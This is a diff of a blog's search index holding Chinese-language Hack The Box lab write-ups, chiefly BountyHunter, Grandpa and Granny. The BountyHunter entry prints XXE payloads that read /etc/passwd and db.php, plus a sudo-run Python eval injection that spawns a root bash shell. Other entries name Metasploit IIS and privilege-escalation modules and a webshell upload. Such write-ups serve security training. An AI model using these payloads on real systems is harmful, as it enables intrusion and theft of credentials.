class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> validationNumber &gt; <span class="number">100</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fileName = <span class="built_in">input</span>(<span class="string">&quot;Please enter the path to the ticket file.\n&quot;</span>)</span><br><span class="line">    ticket = load_file(fileName)</span><br><span class="line">    <span class="comment">#DEBUG print(ticket)</span></span><br><span class="line">    result = evaluate(ticket)</span><br><span class="line">    <span class="keyword">if</span> (result):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Valid ticket.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid ticket.&quot;</span>)</span><br><span class="line">    ticket.close</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>分析Python脚本后，创建一个md文件，使用sudo 运行脚本，提权成功</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Skytrain Inc</span><br><span class="line">## Ticket to </span><br><span class="line">__Ticket Code:__</span><br><span class="line">**11+eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;bash&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
-
-<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104056058.png" class="" title="Getshell">
-
-<table>
-<thead>
-<tr>
-<th align="left">Flag</th>
-<th align="left">Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Flag1</td>
-<td align="left">&#x2F;home&#x2F;development&#x2F;user.txt</td>
-</tr>
-<tr>
-<td align="left">Flag2</td>
-<td align="left">&#x2F;root&#x2F;root.txt</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Hackthebox</category>
-      </categories>
-      <tags>
-        <tag>XXE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Devel</title>
     <url>/Hackthebox/htb/htb-devel/</url>
-    <content><![CDATA[<style>.tjifwteglqgm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="tjifwteglqgm">
+    <content><![CDATA[<style>.krwdijipplhw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devel/0fb6455a29eb4f2682f04a780ce26cb1.png" class="krwdijipplhw">
 
 <span id="more"></span>
 
@@ -481,7 +350,7 @@
 <h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/Hackthebox/htb/htb-devel/image-20250201213314487.png" class="" title="Nmap">
 
 <p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
-<style>.ognxbjxuwjfe{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="ognxbjxuwjfe" alt="登录FTP">
+<style>.qtqymsquinpo{zoom:150%;}</style><img src="/Hackthebox/htb/htb-devel/image-20250201213757511.png" class="qtqymsquinpo" alt="登录FTP">
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
 <img src="/Hackthebox/htb/htb-devel/image-20250201215256322.png" class="" title="生成webshell">
@@ -521,128 +390,9 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Grandpa</title>
-    <url>/Hackthebox/htb/htb-grandpa/</url>
-    <content><![CDATA[<style>.tgfdycwvpilj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="tgfdycwvpilj">
-
-<span id="more"></span>
-
-<table>
-<thead>
-<tr>
-<th>OS</th>
-<th>Difficulty</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Windows</td>
-<td>Easy</td>
-</tr>
-</tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-grandpa/image-20250212200523195.png" class="" title="Nmap">
-
-<p>发现80(IIS 6.0) 端口</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>windows/iis/iis_webdav_scstoragepathfromurl</code> 模块进行漏洞利用</p>
-<img src="/Hackthebox/htb/htb-grandpa/image-20250212201611096.png" class="" title="GetShell">
-
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>local_exploit_suggester</code> 模块进行本地提权的信息收集  </p>
-<img src="/Hackthebox/htb/htb-grandpa/image-20250212202135579.png" class="" title="信息收集">
-
-<p>使用  <code>windows/local/ms14_070_tcpip_ioctl</code> 进行权限提升，提权失败</p>
-<img src="/Hackthebox/htb/htb-grandpa/image-20250212202811599.png" class="" title="提权">
-
-<p>列出进程，迁移进程 <code>migrate 3100</code>，然后重新提权</p>
-<img src="/Hackthebox/htb/htb-grandpa/image-20250212202917826.png" class="" title="进程">
-
-<img src="/Hackthebox/htb/htb-grandpa/image-20250212203009824.png" class="" title="GetShell">
-
-<table>
-<thead>
-<tr>
-<th>Flag</th>
-<th align="left">Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Flag1</td>
-<td align="left">C:\Documents and Settings\Harry\Desktop\user.txt</td>
-</tr>
-<tr>
-<td>Flag2</td>
-<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Hackthebox</category>
-      </categories>
-      <tags>
-        <tag>IIS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB-Granny</title>
-    <url>/Hackthebox/htb/htb-granny/</url>
-    <content><![CDATA[<style>.wuclovzftmqq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="wuclovzftmqq">
-
-<span id="more"></span>
-
-<table>
-<thead>
-<tr>
-<th align="left">OS</th>
-<th align="left">Difficulty</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Windows</td>
-<td align="left">Easy</td>
-</tr>
-</tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-granny/image-20250212204730377.png" class="" title="Nmap">
-
-<p>开放80(IIS 6.0) 端口并且开启了webdav</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msf <code>windows/iis/iis_webdav_upload_asp</code> 模块进行漏洞利用</p>
-<img src="/Hackthebox/htb/htb-granny/image-20250212210017947.png" class="" title="GetShell">
-
-<p>迁移进程</p>
-<img src="/Hackthebox/htb/htb-granny/image-20250212210739530.png" class="" title="进程">
-
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用local_exploit_suggester 模块进行信息收集</p>
-<img src="/Hackthebox/htb/htb-granny/image-20250212205939579.png" class="" title="信息收集">
-
-<p>使用ms15-051 进行提权</p>
-<img src="/Hackthebox/htb/htb-granny/image-20250212210630257.png" class="" title="GetShell">
-
-<table>
-<thead>
-<tr>
-<th align="left">Flag</th>
-<th align="left">Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Flag1</td>
-<td align="left">C:\Documents and Settings\Lakis\Desktop\user.txt</td>
-</tr>
-<tr>
-<td align="left">Flag2</td>
-<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Hackthebox</category>
-      </categories>
-      <tags>
-        <tag>IIS</tag>
-        <tag>配置错误</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-DevOops</title>
     <url>/Hackthebox/htb/htb-devoops/</url>
-    <content><![CDATA[<style>.zyijdtiplire{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="zyijdtiplire">
+    <content><![CDATA[<style>.bwmjjxqvgjwy{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="bwmjjxqvgjwy">
 
 <span id="more"></span>
 
@@ -727,9 +477,207 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-BountyHunter</title>
+    <url>/Hackthebox/htb/htb-bountyhunter/</url>
+    <content><![CDATA[<style>.dozpdgexctqb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="dozpdgexctqb">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Linux</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap 10.10.11.100 -sV -sC  -p- -T4 --min-rate 1000 -e tun0 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 09:08 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.100</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)</span><br><span class="line">|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)</span><br><span class="line">|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Bounty Hunters</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 99.59 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>开放了2个端口22(SSH)和80(HTTP)，对80进行Fuzz</p>
+<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>找到&#x2F;index.php、 &#x2F;portal.php、 &#x2F;db.php</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.11.100/FUZZ.php  -t 100 -ic</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.10.11.100/FUZZ.php</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 100</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">index                   [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 3174ms]</span></span><br><span class="line"><span class="string">portal                  [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 204ms]</span></span><br><span class="line"><span class="string">db                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 105ms]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问&#x2F;portal.php 跳转到表单页面</p>
+<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104837169.png" class="" title="跳转">
+
+<p>使用burp进行抓包，对数据包进行base64解码，发现是XML</p>
+<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104858450.png" class="" title="表单">
+
+<p>尝试进行XXE攻击，找到两个帐号：development和root</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">example</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bugreport</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="symbol">&amp;example;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">cwe</span>&gt;</span>111<span class="tag">&lt;/<span class="name">cwe</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">cvss</span>&gt;</span>3.0<span class="tag">&lt;/<span class="name">cvss</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">reward</span>&gt;</span>20<span class="tag">&lt;/<span class="name">reward</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bugreport</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222092505979.png" class="" title="XXE">
+
+<p>使用PHP Wrapper 读取db.php文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">example</span> <span class="keyword">SYSTEM</span> <span class="keyword">php</span>://filter/convert.base64-encode/resource=db.php<span class="string">&quot;&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;bugreport&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;title&gt;&amp;example;&lt;/title&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;cwe&gt;111&lt;/cwe&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;cvss&gt;3.0&lt;/cvss&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;reward&gt;20&lt;/reward&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;/bugreport&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+
+<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222094939072.png" class="" title="XXE">
+
+<p>解码base64,找到数据库密码，使用development登录SSH</p>
+<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222095232981.png" class="" title="解码">
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>sudo -l</code>找个一个可利用的Python文件</p>
+<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222101020734.png" class="" title="提权">
+
+<p>分析Python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Skytrain Inc Ticket Validation System 0.1</span></span><br><span class="line"><span class="comment">#Do not distribute this file.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_file</span>(<span class="params">loc</span>):</span><br><span class="line">    <span class="keyword">if</span> loc.endswith(<span class="string">&quot;.md&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(loc, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong file type.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evaluate</span>(<span class="params">ticketFile</span>):</span><br><span class="line">    <span class="comment">#Evaluates a ticket to check for ireggularities.</span></span><br><span class="line">    code_line = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(ticketFile.readlines()):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;# Skytrain Inc&quot;</span>):   // md 文档第<span class="number">1</span>行需要包含</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;## Ticket to &quot;</span>):  //md 文档第<span class="number">2</span>行需要包含，注意有个空格</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Destination: <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(x.strip().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">3</span>:])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x.startswith(<span class="string">&quot;__Ticket Code:__&quot;</span>): //md 文档第<span class="number">3</span>行需要包含</span><br><span class="line">            code_line = i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code_line <span class="keyword">and</span> i == code_line:  //md 文档第<span class="number">4</span>行需要包含</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;**&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            ticketCode = x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>]  //匹配**开头，并且根据+分割，取第一项</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(ticketCode) % <span class="number">7</span> == <span class="number">4</span>:  //取出的值模<span class="number">7</span> 等于<span class="number">4</span> 如<span class="number">4</span>,<span class="number">11</span>，<span class="number">18</span></span><br><span class="line">                validationNumber = <span class="built_in">eval</span>(x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> validationNumber &gt; <span class="number">100</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fileName = <span class="built_in">input</span>(<span class="string">&quot;Please enter the path to the ticket file.\n&quot;</span>)</span><br><span class="line">    ticket = load_file(fileName)</span><br><span class="line">    <span class="comment">#DEBUG print(ticket)</span></span><br><span class="line">    result = evaluate(ticket)</span><br><span class="line">    <span class="keyword">if</span> (result):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Valid ticket.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid ticket.&quot;</span>)</span><br><span class="line">    ticket.close</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分析Python脚本后，创建一个md文件，使用sudo 运行脚本，提权成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Skytrain Inc</span><br><span class="line">## Ticket to </span><br><span class="line">__Ticket Code:__</span><br><span class="line">**11+eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;bash&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104056058.png" class="" title="Getshell">
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">&#x2F;home&#x2F;development&#x2F;user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>XXE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Grandpa</title>
+    <url>/Hackthebox/htb/htb-grandpa/</url>
+    <content><![CDATA[<style>.vvyonorxtfhq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="vvyonorxtfhq">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Windows</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-grandpa/image-20250212200523195.png" class="" title="Nmap">
+
+<p>发现80(IIS 6.0) 端口</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>windows/iis/iis_webdav_scstoragepathfromurl</code> 模块进行漏洞利用</p>
+<img src="/Hackthebox/htb/htb-grandpa/image-20250212201611096.png" class="" title="GetShell">
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>local_exploit_suggester</code> 模块进行本地提权的信息收集  </p>
+<img src="/Hackthebox/htb/htb-grandpa/image-20250212202135579.png" class="" title="信息收集">
+
+<p>使用  <code>windows/local/ms14_070_tcpip_ioctl</code> 进行权限提升，提权失败</p>
+<img src="/Hackthebox/htb/htb-grandpa/image-20250212202811599.png" class="" title="提权">
+
+<p>列出进程，迁移进程 <code>migrate 3100</code>，然后重新提权</p>
+<img src="/Hackthebox/htb/htb-grandpa/image-20250212202917826.png" class="" title="进程">
+
+<img src="/Hackthebox/htb/htb-grandpa/image-20250212203009824.png" class="" title="GetShell">
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Flag1</td>
+<td align="left">C:\Documents and Settings\Harry\Desktop\user.txt</td>
+</tr>
+<tr>
+<td>Flag2</td>
+<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>IIS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Granny</title>
+    <url>/Hackthebox/htb/htb-granny/</url>
+    <content><![CDATA[<style>.nhsyvlshyfpf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="nhsyvlshyfpf">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Windows</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-granny/image-20250212204730377.png" class="" title="Nmap">
+
+<p>开放80(IIS 6.0) 端口并且开启了webdav</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msf <code>windows/iis/iis_webdav_upload_asp</code> 模块进行漏洞利用</p>
+<img src="/Hackthebox/htb/htb-granny/image-20250212210017947.png" class="" title="GetShell">
+
+<p>迁移进程</p>
+<img src="/Hackthebox/htb/htb-granny/image-20250212210739530.png" class="" title="进程">
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用local_exploit_suggester 模块进行信息收集</p>
+<img src="/Hackthebox/htb/htb-granny/image-20250212205939579.png" class="" title="信息收集">
+
+<p>使用ms15-051 进行提权</p>
+<img src="/Hackthebox/htb/htb-granny/image-20250212210630257.png" class="" title="GetShell">
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">C:\Documents and Settings\Lakis\Desktop\user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>IIS</tag>
+        <tag>配置错误</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Jerry</title>
     <url>/Hackthebox/htb/htb-jerry/</url>
-    <content><![CDATA[<style>.coofkznxqtqg{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="coofkznxqtqg">
+    <content><![CDATA[<style>.cqjqdxomcske{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="cqjqdxomcske">
 
 <span id="more"></span>
 
@@ -789,7 +737,7 @@
   <entry>
     <title>HTB-Knife</title>
     <url>/Hackthebox/htb/htb-knife/</url>
-    <content><![CDATA[<style>.evjoxtrjdruq{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="evjoxtrjdruq">
+    <content><![CDATA[<style>.ujyqdjbrhdot{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="ujyqdjbrhdot">
 
 <span id="more"></span>
 
@@ -856,7 +804,7 @@
   <entry>
     <title>HTB-Lame</title>
     <url>/Hackthebox/htb/htb-lame/</url>
-    <content><![CDATA[<style>.ryibtaggyxdf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="ryibtaggyxdf">
+    <content><![CDATA[<style>.iwpfrhrcjrlk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="iwpfrhrcjrlk">
 
 <span id="more"></span>
 
@@ -872,11 +820,11 @@
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.ferrstcgqiut{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="ferrstcgqiut" alt="Nmap">
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.ynihqdastqhs{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="ynihqdastqhs" alt="Nmap">
 
 <p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/Hackthebox/htb/htb-lame/image-20250201160141376.png" class="" title="searchploit"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
-<style>.holuuyhijhos{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="holuuyhijhos" alt="msfconsole">
+<style>.kvykrfvhuofd{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="kvykrfvhuofd" alt="msfconsole">
 
 <img src="/Hackthebox/htb/htb-lame/image-20250201175040335.png" class="" title="searchsploit">
 
@@ -907,9 +855,57 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Legacy</title>
